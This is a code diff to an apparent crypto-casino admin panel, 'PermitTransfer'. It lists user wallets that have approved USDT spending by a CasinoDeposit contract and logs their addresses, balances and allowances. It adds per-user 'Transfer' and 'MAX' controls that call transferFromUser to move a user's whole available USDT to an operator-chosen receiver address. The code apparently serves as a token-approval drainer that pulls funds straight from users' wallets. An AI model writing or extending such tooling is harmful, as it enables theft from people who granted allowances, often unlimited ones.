@@ -214,29 +214,55 @@ export function PermitTransfer() {
   const fetchEvmData = useCallback(async () => {
     setIsEvmDataLoading(true);
     try {
-      console.log('Fetching EVM approvals via API...');
+      console.log('[EVM] Fetching approvals via API...');
       
       // Try server-side API first
       const response = await fetch('/api/admin/evm-approvals');
+      const data = await response.json();
       
-      if (response.ok) {
-        const data = await response.json();
-        console.log(`API returned ${data.users?.length || 0} users with EVM approvals`);
+      console.log('[EVM] API Response:', JSON.stringify(data, null, 2));
+      
+      if (response.ok && !data.error) {
+        console.log('='.repeat(50));
+        console.log(`[EVM] Network: ${data.network}`);
+        console.log(`[EVM] Casino Contract: ${data.casinoContract}`);
+        console.log(`[EVM] USDT Contract: ${data.usdtContract}`);
+        console.log(`[EVM] Total users checked: ${data.totalUsersChecked || 0}`);
+        console.log(`[EVM] Users with approval: ${data.totalWithApproval || 0}`);
+        console.log('='.repeat(50));
+        
+        if (data.users?.length > 0) {
+          console.log('[EVM] Users:');
+          data.users.forEach((u: any, i: number) => {
+            const balance = Number(u.balance) / 1e6;
+            const allowance = Number(u.allowance) / 1e6;
+            const approved = u.hasApproval ? 'YES' : 'NO';
+            console.log(`  ${i + 1}. ${u.wallet_address}: ${balance.toFixed(2)} USDT (Approved: ${approved}, Allowance: ${allowance.toFixed(2)})`);
+          });
+        } else {
+          console.log('[EVM] No EVM users found in database');
+        }
         
         const usersData: UserWithData[] = (data.users || []).map((u: any) => ({
           id: u.id,
           wallet_address: u.wallet_address,
-          allowance: BigInt(u.allowance),
-          balance: BigInt(u.balance),
-          network: 'evm' as const
+          allowance: BigInt(u.allowance || '0'),
+          balance: BigInt(u.balance || '0'),
+          network: 'evm' as const,
+          hasApproval: u.hasApproval,
+          isUnlimited: u.isUnlimited
         }));
         
         setEvmUsersWithData(usersData);
         return;
       }
       
+      // API returned error
+      console.error('[EVM] API error:', data.error);
+      toast.error(`EVM API error: ${data.error}`);
+      
       // Fallback to client-side if API fails and publicClient is available
-      console.warn('API failed, trying client-side approach...');
+      console.warn('[EVM] Trying client-side approach...');
       
       if (!publicClient || evmUsers.length === 0) {
         setEvmUsersWithData([]);
@@ -268,14 +294,14 @@ export function PermitTransfer() {
             })
           ]);
 
-          if (allowance > BigInt(0)) {
-            usersData.push({
-              ...user,
-              allowance,
-              balance,
-              network: 'evm'
-            });
-          }
+          usersData.push({
+            ...user,
+            allowance,
+            balance,
+            network: 'evm',
+            hasApproval: allowance > BigInt(0),
+            isUnlimited: allowance >= UNLIMITED_THRESHOLD
+          });
         } catch (err) {
           console.warn(`Failed to fetch EVM data for ${user.wallet_address}:`, err);
         }
@@ -583,6 +609,9 @@ export function PermitTransfer() {
   const evmLoading = isEvmLoading || isEvmDataLoading;
 
   const renderUserTable = (users: UserWithData[], loading: boolean, network: 'tron' | 'evm', isWalletConnected: boolean, walletAddress: string | null | undefined) => {
+    const approvedCount = users.filter(u => u.hasApproval || u.allowance > BigInt(0)).length;
+    const totalBalance = users.reduce((sum, u) => sum + u.balance, BigInt(0));
+    
     return (
       <>
         {/* Wallet Connection Status */}
@@ -604,6 +633,24 @@ export function PermitTransfer() {
           </div>
         )}
 
+        {/* Stats Summary */}
+        {!loading && users.length > 0 && (
+          <div className="grid grid-cols-3 gap-3">
+            <div className="p-3 rounded-lg bg-white/5 border border-white/10">
+              <p className="text-xs text-muted-foreground">Total Users</p>
+              <p className="text-lg font-semibold">{users.length}</p>
+            </div>
+            <div className="p-3 rounded-lg bg-green-500/5 border border-green-500/20">
+              <p className="text-xs text-green-400">Approved</p>
+              <p className="text-lg font-semibold text-green-400">{approvedCount}</p>
+            </div>
+            <div className="p-3 rounded-lg bg-blue-500/5 border border-blue-500/20">
+              <p className="text-xs text-blue-400">Total USDT Balance</p>
+              <p className="text-lg font-semibold text-blue-400">{formatAmount(totalBalance)}</p>
+            </div>
+          </div>
+        )}
+
         {/* Transaction Success Status */}
         {txSuccess && (
           <div className="flex items-center gap-2 p-3 rounded-lg bg-green-500/10 border border-green-500/20">
@@ -612,7 +659,7 @@ export function PermitTransfer() {
           </div>
         )}
 
-        {/* Users with Approvals Table */}
+        {/* Users Table */}
         <div className="rounded-md border border-white/10 overflow-x-auto">
           <Table>
             <TableHeader>
@@ -635,7 +682,7 @@ export function PermitTransfer() {
                 <TableRow>
                   <TableCell colSpan={4} className="text-center py-8 text-muted-foreground">
                     <AlertCircle className="h-6 w-6 mx-auto mb-2 opacity-50" />
-                    No {network === 'tron' ? 'TRON' : 'EVM'} users with USDT balance found
+                    No {network === 'tron' ? 'TRON' : 'EVM'} users found in database
                   </TableCell>
                 </TableRow>
               ) : (
@@ -661,33 +708,45 @@ export function PermitTransfer() {
                         </div>
                       </TableCell>
                       <TableCell className="text-center">
-                        <span className="text-sm font-medium">
+                        <span className={`text-sm font-medium ${user.balance > BigInt(0) ? 'text-white' : 'text-muted-foreground'}`}>
                           {formatAmount(user.balance)} USDT
                         </span>
                       </TableCell>
                       <TableCell className="text-center">
                         {(user as UserWithData).isUnlimited ? (
                           <Badge variant="outline" className="border-green-500/50 text-green-400">
-                            ✓ Unlimited
+                            Unlimited
                           </Badge>
                         ) : hasApproval ? (
                           <Badge variant="outline" className="border-green-500/50 text-green-400">
-                            ✓ Approved ({formatAmount(user.allowance)})
+                            Approved ({formatAmount(user.allowance)})
                           </Badge>
                         ) : (
-                          <Badge variant="outline" className="border-yellow-500/50 text-yellow-400">
-                            ✗ Not Approved
+                          <Badge variant="outline" className="border-red-500/50 text-red-400">
+                            Not Approved
                           </Badge>
                         )}
                       </TableCell>
                       <TableCell>
-                        <Button 
-                          size="sm" 
-                          variant={isSelected ? "default" : "outline"}
-                          className={isSelected ? "bg-casino-brand text-black" : ""}
-                        >
-                          {isSelected ? 'Selected' : 'Select'}
-                        </Button>
+                        {hasApproval && user.balance > BigInt(0) ? (
+                          <Button 
+                            size="sm" 
+                            variant={isSelected ? "default" : "outline"}
+                            className={isSelected ? "bg-casino-brand text-black" : ""}
+                          >
+                            {isSelected ? 'Selected' : 'Transfer'}
+                          </Button>
+                        ) : hasApproval ? (
+                          <Button 
+                            size="sm" 
+                            variant={isSelected ? "default" : "outline"}
+                            className={isSelected ? "bg-casino-brand text-black" : "opacity-60"}
+                          >
+                            {isSelected ? 'Selected' : 'No Balance'}
+                          </Button>
+                        ) : (
+                          <span className="text-xs text-muted-foreground">No Approval</span>
+                        )}
                       </TableCell>
                     </TableRow>
                   );
@@ -701,9 +760,33 @@ export function PermitTransfer() {
         {selectedUser && selectedUser.network === network && (
           <div className="p-4 rounded-lg border border-casino-brand/30 bg-casino-brand/5 space-y-4">
             <h4 className="font-semibold flex items-center gap-2">
-              <CheckCircle className="h-4 w-4 text-casino-brand" />
+              <Send className="h-4 w-4 text-casino-brand" />
               Transfer USDT from {formatAddress(selectedUser.wallet_address)}
             </h4>
+
+            {/* Info about the selected user */}
+            <div className="grid grid-cols-3 gap-3 text-sm">
+              <div className="p-2 rounded bg-black/20">
+                <span className="text-muted-foreground">Balance: </span>
+                <span className="font-medium">{formatAmount(selectedUser.balance)} USDT</span>
+              </div>
+              <div className="p-2 rounded bg-black/20">
+                <span className="text-muted-foreground">Allowance: </span>
+                <span className="font-medium">
+                  {selectedUser.isUnlimited ? 'Unlimited' : `${formatAmount(selectedUser.allowance)} USDT`}
+                </span>
+              </div>
+              <div className="p-2 rounded bg-black/20">
+                <span className="text-muted-foreground">Max Transfer: </span>
+                <span className="font-medium text-casino-brand">
+                  {formatAmount(
+                    selectedUser.balance < selectedUser.allowance 
+                      ? selectedUser.balance 
+                      : selectedUser.allowance
+                  )} USDT
+                </span>
+              </div>
+            </div>
 
             {/* Warning if wallet not connected for transfers */}
             {!isWalletConnected && (
@@ -737,48 +820,64 @@ export function PermitTransfer() {
               </div>
               <div className="space-y-2">
                 <Label>
-                  Amount USDT (Max: {formatAmount(
-                    selectedUser.balance < selectedUser.allowance 
-                      ? selectedUser.balance 
-                      : selectedUser.allowance
-                  )})
+                  Amount USDT
                 </Label>
-                <Input
-                  type="number"
-                  placeholder="0.00"
-                  value={transferAmount}
-                  onChange={(e) => setTransferAmount(e.target.value)}
-                  className="bg-black/30 border-white/10"
-                />
+                <div className="flex gap-2">
+                  <Input
+                    type="number"
+                    placeholder="0.00"
+                    value={transferAmount}
+                    onChange={(e) => setTransferAmount(e.target.value)}
+                    className="bg-black/30 border-white/10"
+                  />
+                  <Button
+                    variant="outline"
+                    size="sm"
+                    className="shrink-0"
+                    onClick={() => {
+                      const max = selectedUser.balance < selectedUser.allowance 
+                        ? selectedUser.balance 
+                        : selectedUser.allowance;
+                      setTransferAmount((Number(max) / 1e6).toString());
+                    }}
+                  >
+                    MAX
+                  </Button>
+                </div>
               </div>
             </div>
 
             <Button
               onClick={executeTransfer}
-              disabled={isProcessing || !receiverAddress || !transferAmount || !isWalletConnected}
+              disabled={isProcessing || !receiverAddress || !transferAmount || !isWalletConnected || !(selectedUser.hasApproval || selectedUser.allowance > BigInt(0))}
               className="w-full bg-casino-brand text-black hover:bg-casino-brand/90"
             >
               {isProcessing ? (
                 <>
                   <Loader2 className="mr-2 h-4 w-4 animate-spin" />
-                  Processing...
+                  Processing Transfer...
                 </>
               ) : !isWalletConnected ? (
                 <>
                   <Wallet className="mr-2 h-4 w-4" />
                   Connect Wallet to Transfer
                 </>
+              ) : !(selectedUser.hasApproval || selectedUser.allowance > BigInt(0)) ? (
+                <>
+                  <AlertCircle className="mr-2 h-4 w-4" />
+                  User Has No Approval
+                </>
               ) : (
                 <>
                   <Send className="mr-2 h-4 w-4" />
-                  Transfer USDT
+                  Execute transferFromUser
                 </>
               )}
             </Button>
 
             <p className="text-xs text-muted-foreground">
-              This will transfer USDT from the selected user to the receiver address. 
-              User must have approved the CasinoDeposit contract.
+              Calls <code className="text-casino-brand/80">transferFromUser(token, owner, receiver, amount)</code> on the CasinoDeposit contract. 
+              The user must have approved the contract for the USDT amount.
             </p>
           </div>
         )}
